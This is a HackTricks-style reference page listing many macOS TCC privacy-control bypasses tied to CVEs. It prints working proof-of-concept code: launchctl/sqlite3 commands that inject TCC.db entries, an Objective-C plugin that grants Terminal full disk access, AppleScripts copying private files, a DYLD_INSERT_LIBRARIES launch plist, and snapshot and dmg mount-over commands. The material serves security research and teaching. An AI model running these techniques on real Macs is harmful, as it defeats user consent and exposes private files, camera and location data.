# macOS TCC Bypasses

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
{% endhint %}
{% endhint %}

## By functionality

### Write Bypass

This is not a bypass, it's just how TCC works: **It doesn't protect from writing**. If Terminal **doesn't have access to read the Desktop of a user it can still write into it**:

```shell-session
username@hostname ~ % ls Desktop 
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```

The **extended attribute `com.apple.macl`** is added to the new **file** to give the **creators app** access to read it.

### TCC ClickJacking

It's possible to **put a window over the TCC prompt** to make the user **accept** it without noticing. You can find a PoC in [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**.**

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### TCC Request by arbitrary name

Attacker can **create apps with any name** (e.g. Finder, Google Chrome...) in the **`Info.plist`** and make it request access to some TCC protected location. The user will think that the legit application is the one requesting this access.\
Moreover, it's possible to **remove the legit app from the Dock and put the fake one on it**, so when the user clicks on the fake one (which can use the same icon) it could call the legit one, ask for TCC permissions and execute a malware, making the user believe the legit app requested the access.

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

More info and PoC in:

{% content-ref url="../../../macos-privilege-escalation.md" %}
[macos-privilege-escalation.md](../../../macos-privilege-escalation.md)
{% endcontent-ref %}

### SSH Bypass

By default an access via **SSH used to have "Full Disk Access"**. In order to disable this you need to have it listed but disabled (removing it from the list won't remove those privileges):

![](<../../../../../.gitbook/assets/image (1077).png>)

Here you can find examples of how some **malwares have been able to bypass this protection**:

* [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)

{% hint style="danger" %}
Note that now, in order to be able to enable SSH you need **Full Disk Access**
{% endhint %}

### Handle extensions - CVE-2022-26767

The attribute **`com.apple.macl`** is given to files to give a **certain application permissions to read it.** This attribute is set when **drag\&drop** a file over an app, or when a user **double-clicks** a file to open it with the **default application**.

Therefore, a user could **register a malicious app** to handle all the extensions and call Launch Services to **open** any file (so the malicious file will be granted access to read it).

### iCloud

The entitlement **`com.apple.private.icloud-account-access`** it's possible to communicate with **`com.apple.iCloudHelper`** XPC service which will **provide iCloud tokens**.

**iMovie** and **Garageband** had this entitlement and others that allowed.

For more **information** about the exploit to **get icloud tokens** from that entitlement check the talk: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=\_6e2LhmxVc0)

### kTCCServiceAppleEvents / Automation

An app with the **`kTCCServiceAppleEvents`** permission will be able to **control other Apps**. This means that it could be able to **abuse the permissions granted to the other Apps**.

For more info about Apple Scripts check:

{% content-ref url="macos-apple-scripts.md" %}
[macos-apple-scripts.md](macos-apple-scripts.md)
{% endcontent-ref %}

For example, if an App has **Automation permission over `iTerm`**, for example in this example **`Terminal`** has access over iTerm:

<figure><img src="../../../../../.gitbook/assets/image (981).png" alt=""><figcaption></figcaption></figure>

#### Over iTerm

Terminal, who doesn't have FDA, can call iTerm, which has it, and use it to perform actions:

{% code title="iterm.script" %}
```applescript
tell application "iTerm"
    activate
    tell current window
        create tab with default profile
    end tell
    tell current session of current window
        write text "cp ~/Desktop/private.txt /tmp"
    end tell
end tell
```
{% endcode %}

```bash
osascript iterm.script
```

#### Over Finder

Or if an App has access over Finder, it could a script such as this one:

```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```

## By App behaviour

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

The userland **tccd daemon** what using the **`HOME`** **env** variable to access the TCC users database from: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

According to [this Stack Exchange post](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) and because the TCC daemon is running via `launchd` within the current user’s domain, it's possible to **control all environment variables** passed to it.\
Thus, an **attacker could set `$HOME` environment** variable in **`launchctl`** to point to a **controlled** **directory**, **restart** the **TCC** daemon, and then **directly modify the TCC database** to give itself **every TCC entitlement available** without ever prompting the end user.\
PoC:

```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"                     
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump                                                               
$> sqlite3 TCC.db "INSERT INTO access
                   VALUES('kTCCServiceSystemPolicyDocumentsFolder',
                   'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
                   NULL,
                   NULL,
                   'UNUSED',
                   NULL,
                   NULL,
                   1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```

### CVE-2021-30761 - Notes

Notes had access to TCC protected locations but when a note is created this is **created in a non-protected location**. So, you could ask notes to copy a protected file in a noe (so in a non-protected location) and then access the file:

<figure><img src="../../../../../.gitbook/assets/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

The binary `/usr/libexec/lsd` with the library `libsecurity_translocate` had the entitlement `com.apple.private.nullfs_allow` which allowed it to crate **nullfs** mount and had the entitlement `com.apple.private.tcc.allow` with **`kTCCServiceSystemPolicyAllFiles`** to access every file.

It was possible to add the quarantine attribute to "Library", call the **`com.apple.security.translocation`** XPC service and then it would map Library to **`$TMPDIR/AppTranslocation/d/d/Library`** where all the documents inside Library could be **accessed**.

### CVE-2023-38571 - Music & TV <a href="#cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv" id="cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv"></a>

**`Music`** has an interesting feature: When it's running, it will **import** the files dropped to **`~/Music/Music/Media.localized/Automatically Add to Music.localized`** into the user's "media library". Moreover, it calls something like: **`rename(a, b);`** where `a` and `b` are:

* `a = "~/Music/Music/Media.localized/Automatically Add to Music.localized/myfile.mp3"`
* `b = "~/Music/Music/Media.localized/Automatically Add to Music.localized/Not Added.localized/2023-09-25 11.06.28/myfile.mp3`

This **`rename(a, b);`** bevabiour is vulnerable to a **Race Condition**, as it's possible to put inside the `Automatically Add to Music.localized` folder a fake **TCC.db** file and then when the new forder(b) is created to copy the file, delete it, and point it to **`~/Library/Application Support/com.apple.TCC`**/.

### SQLITE\_SQLLOG\_DIR - CVE-2023-32422

If **`SQLITE_SQLLOG_DIR="path/folder"`** basically means that **any open db is copied to that path**. In this CVE this control was abused to **write** inside a **SQLite database** that is going to be **open by a process with FDA the TCC database**, and then abuse **`SQLITE_SQLLOG_DIR`** with a **symlink in the filename** so when that database is **open**, the user **TCC.db is overwritten** with the opened one.\
**More info** [**in the writeup**](https://gergelykalman.com/sqlol-CVE-2023-32422-a-macos-tcc-bypass.html) **and**[ **in the talk**](https://www.youtube.com/watch?v=f1HA5QhLQ7Y\&t=20548s).

### **SQLITE\_AUTO\_TRACE**

If the environment variable **`SQLITE_AUTO_TRACE`** is set, the library **`libsqlite3.dylib`** will start **logging** all the SQL queries. Many applications used this library, so it was possible to log all their SQLite queries.

Several Apple applications used this library to access TCC protected information.

```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```

### MTL\_DUMP\_PIPELINES\_TO\_JSON\_FILE - CVE-2023-32407

This **env variable is used by the `Metal` framework** which is a dependency to various programs, most notably `Music`, which has FDA.

Setting the following: `MTL_DUMP_PIPELINES_TO_JSON_FILE="path/name"`. If `path` is a valid directory, the bug will trigger and we can use `fs_usage` to see what is going on in the program:

* a file will be `open()`ed, called `path/.dat.nosyncXXXX.XXXXXX` (X is random)
* one or more `write()`s will write the contents to the file (we do not control this)
* `path/.dat.nosyncXXXX.XXXXXX` will be `renamed()`d to `path/name`

It's a temporary file write, followed by a **`rename(old, new)`** **which is not secure.**

It's not secure because it has to **resolve the old and new paths separately**, which can take some time and can be vulenrable to a Race Condition. For more information you can check out the `xnu` function `renameat_internal()`.

{% hint style="danger" %}
So, basically, if a privileged process is renaming from a folder you control, you could win a RCE and make it access a different file or, like in this CVE, open the file the privileged app created and store a FD.

If the rename access a folder you control, while you have modified the source file or has a FD to it, you change the destination file (or folder) to point a symlink, so you can write whenever you want.
{% endhint %}

This was the attack in the CVE: For example, to overwrite the user's `TCC.db`, we can:

* create `/Users/hacker/ourlink` to point to `/Users/hacker/Library/Application Support/com.apple.TCC/`
* create the directory `/Users/hacker/tmp/`
* set `MTL_DUMP_PIPELINES_TO_JSON_FILE=/Users/hacker/tmp/TCC.db`
* trigger the bug by running `Music` with this env var
* catch the `open()` of `/Users/hacker/tmp/.dat.nosyncXXXX.XXXXXX` (X is random)
  * here we also `open()` this file for writing, and hold on to the file descriptor
* atomically switch `/Users/hacker/tmp` with `/Users/hacker/ourlink` **in a loop**
  * we do this to maximize our chances of succeeding as the race window is pretty slim, but losing the race has negligible downside
* wait a bit
* test if we got lucky
  * if not, run again from the top

More info in [https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html](https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html)

{% hint style="danger" %}
Now, if you try to use the env variable `MTL_DUMP_PIPELINES_TO_JSON_FILE` apps won't launch
{% endhint %}

### Apple Remote Desktop

As root you could enable this service and the **ARD agent will have full disk access** which could then be abused by a user to make it copy a new **TCC user database**.

## By **NFSHomeDirectory**

TCC uses a database in the user's HOME folder to control access to resources specific to the user at **$HOME/Library/Application Support/com.apple.TCC/TCC.db**.\
Therefore, if the user manages to restart TCC with a $HOME env variable pointing to a **different folder**, the user could create a new TCC database in **/Library/Application Support/com.apple.TCC/TCC.db** and trick TCC to grant any TCC permission to any app.

{% hint style="success" %}
Note that Apple uses the setting stored within the user's profile in the **`NFSHomeDirectory`** attribute for the **value of `$HOME`**, so if you compromise an application with permissions to modify this value (**`kTCCServiceSystemPolicySysAdminFiles`**), you can **weaponize** this option with a TCC bypass.
{% endhint %}

### [CVE-2020–9934 - TCC](./#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](./#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

The **first POC** uses [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) and [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) to modify the **HOME** folder of the user.

1. Get a _csreq_ blob for the target app.
2. Plant a fake _TCC.db_ file with required access and the _csreq_ blob.
3. Export the user’s Directory Services entry with [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/).
4. Modify the Directory Services entry to change the user’s home directory.
5. Import the modified Directory Services entry with [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
6. Stop the user’s _tccd_ and reboot the process.

The second POC used **`/usr/libexec/configd`** which had `com.apple.private.tcc.allow` with the value `kTCCServiceSystemPolicySysAdminFiles`.\
It was possible to run **`configd`** with the **`-t`** option, an attacker could specify a **custom Bundle to load**. Therefore, the exploit **replaces** the **`dsexport`** and **`dsimport`** method of changing the user’s home directory with a **`configd` code injection**.

For more info check the [**original report**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).

## By process injection

There are different techniques to inject code inside a process and abuse its TCC privileges:

{% content-ref url="../../../macos-proces-abuse/" %}
[macos-proces-abuse](../../../macos-proces-abuse/)
{% endcontent-ref %}

Moreover, the most common process injection to bypass TCC found is via **plugins (load library)**.\
Plugins are extra code usually in the form of libraries or plist, that will be **loaded by the main application** and will execute under its context. Therefore, if the main application had access to TCC restricted files (via granted permissions or entitlements), the **custom code will also have it**.

### CVE-2020-27937 - Directory Utility

The application `/System/Library/CoreServices/Applications/Directory Utility.app` had the entitlement **`kTCCServiceSystemPolicySysAdminFiles`**, loaded plugins with **`.daplug`** extension and **didn't have the hardened** runtime.

In order to weaponize this CVE, the **`NFSHomeDirectory`** is **changed** (abusing the previous entitlement) in order to be able to **take over the users TCC databas**e to bypass TCC.

For more info check the [**original report**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).

### CVE-2020-29621 - Coreaudiod

The binary **`/usr/sbin/coreaudiod`** had the entitlements `com.apple.security.cs.disable-library-validation` and `com.apple.private.tcc.manager`. The first **allowing code injection** and second one giving it access to **manage TCC**.

This binary allowed to load **third party plug-ins** from the folder `/Library/Audio/Plug-Ins/HAL`. Therefore, it was possible to **load a plugin and abuse the TCC permissions** with this PoC:

```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
    CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");
    
    CFStringRef bundleID = CFSTR("com.apple.Terminal");
    CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
    SecRequirementRef requirement = NULL;
    SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
    CFDataRef requirementData = NULL;
    SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);
    
    TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {
    
    add_tcc_entry();
    
    NSLog(@"[+] Exploitation finished...");
    exit(0);
```

For more info check the [**original report**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).

### Device Abstraction Layer (DAL) Plug-Ins

System applications that open camera stream via Core Media I/O (apps with **`kTCCServiceCamera`**) load **in the process these plugins** located in `/Library/CoreMediaIO/Plug-Ins/DAL` (not SIP restricted).

Just storing in there a library with the common **constructor** will work to **inject code**.

Several Apple applications were vulnerable to this.

### Firefox

The Firefox application had the `com.apple.security.cs.disable-library-validation` and `com.apple.security.cs.allow-dyld-environment-variables` entitlements:

```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>com.apple.security.cs.allow-unsigned-executable-memory</key>
    <true/>
    <key>com.apple.security.cs.disable-library-validation</key>
    <true/>
    <key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
    <true/>
    <key>com.apple.security.device.audio-input</key>
    <true/>
    <key>com.apple.security.device.camera</key>
    <true/>
    <key>com.apple.security.personal-information.location</key>
    <true/>
    <key>com.apple.security.smartcard</key>
    <true/>
</dict>
</plist>
```

Fore more info about how to easily exploit this [**check the original report**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).

### CVE-2020-10006

The binary `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` had the entitlements **`com.apple.private.tcc.allow`** and **`com.apple.security.get-task-allow`**, which allowed to inject code inside the process and use the TCC privileges.

### CVE-2023-26818 - Telegram

Telegram had the entitlements **`com.apple.security.cs.allow-dyld-environment-variables`** and **`com.apple.security.cs.disable-library-validation`**, so it was possible to abuse it to **get access to its permissions** such recording with the camera. You can [**find the payload in the writeup**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).

Note how to use the env variable to load a library a **custom plist** was created to inject this library and **`launchctl`** was used to launch it:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
       <key>Label</key>
        <string>com.telegram.launcher</string>
        <key>RunAtLoad</key>
        <true/>
        <key>EnvironmentVariables</key>
        <dict>
          <key>DYLD_INSERT_LIBRARIES</key>
          <string>/tmp/telegram.dylib</string>
        </dict>
        <key>ProgramArguments</key>
        <array>
  <string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
        </array>
        <key>StandardOutPath</key>
        <string>/tmp/telegram.log</string>
        <key>StandardErrorPath</key>
        <string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```

## By open invocations

It's possible to invoke **`open`** even while sandboxed

### Terminal Scripts

It's quiet common to give terminal **Full Disk Access (FDA)**, at least in computers used by tech people. And it's possible to invoke **`.terminal`** scripts using with it.

**`.terminal`** scripts are plist files such as this one with the command to execute in the **`CommandString`** key:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
    <key>CommandString</key>
    <string>cp ~/Desktop/private.txt /tmp/;</string>
    <key>ProfileCurrentVersion</key>
    <real>2.0600000000000001</real>
    <key>RunCommandAsShell</key>
    <false/>
    <key>name</key>
    <string>exploit</string>
    <key>type</key>
    <string>Window Settings</string>
</dict>
</plist>
```

An application could write a terminal script in a location such as /tmp and launch it with a come such as:

```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```

## By mounting

### CVE-2020-9771 - mount\_apfs TCC bypass and privilege escalation

**Any user** (even unprivileged ones) can create and mount a time machine snapshot an **access ALL the files** of that snapshot.\
The **only privileged** needed is for the application used (like `Terminal`) to have **Full Disk Access** (FDA) access (`kTCCServiceSystemPolicyAllfiles`) which need to be granted by an admin.

{% code overflow="wrap" %}
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
{% endcode %}

A more detailed explanation can be [**found in the original report**](https://theevilbit.github.io/posts/cve\_2020\_9771/)**.**

### CVE-2021-1784 & CVE-2021-30808 - Mount over TCC file

Even if TCC DB file is protected, It was possible to **mount over the directory** a new TCC.db file:

{% code overflow="wrap" %}
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```
{% endcode %}

```python
# This was the python function to create the dmg
def create_dmg():
    os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
    os.system("mkdir /tmp/mnt")
    os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
    os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
    os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
    os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```

Check the **full exploit** in the [**original writeup**](https://theevilbit.github.io/posts/cve-2021-30808/).

### asr

The tool **`/usr/sbin/asr`** allowed to copy the whole disk and mount it in another place bypassing TCC protections.

### Location Services

There is a third TCC database in **`/var/db/locationd/clients.plist`** to indicate clients allowed to **access location services**.\
The folder **`/var/db/locationd/` wasn't protected from DMG mounting** so it was possible to mount our own plist.

## By startup apps

{% content-ref url="../../../../macos-auto-start-locations.md" %}
[macos-auto-start-locations.md](../../../../macos-auto-start-locations.md)
{% endcontent-ref %}

## By grep

In several occasions files will store sensitive information like emails, phone numbers, messages... in non protected locations (which count as a vulnerability in Apple).

<figure><img src="../../../../../.gitbook/assets/image (474).png" alt=""><figcaption></figcaption></figure>

## Synthetic Clicks

This doesn't work anymore, but it [**did in the past**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>

Another way using [**CoreGraphics events**](https://objectivebythesea.org/v2/talks/OBTS\_v2\_Wardle.pdf):

<figure><img src="../../../../../.gitbook/assets/image (30).png" alt="" width="563"><figcaption></figcaption></figure>

## Reference

* [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
* [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
* [**20+ Ways to Bypass Your macOS Privacy Mechanisms**](https://www.youtube.com/watch?v=W9GxnP8c8FU)
* [**Knockout Win Against TCC - 20+ NEW Ways to Bypass Your MacOS Privacy Mechanisms**](https://www.youtube.com/watch?v=a9hsxPdRxsY)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
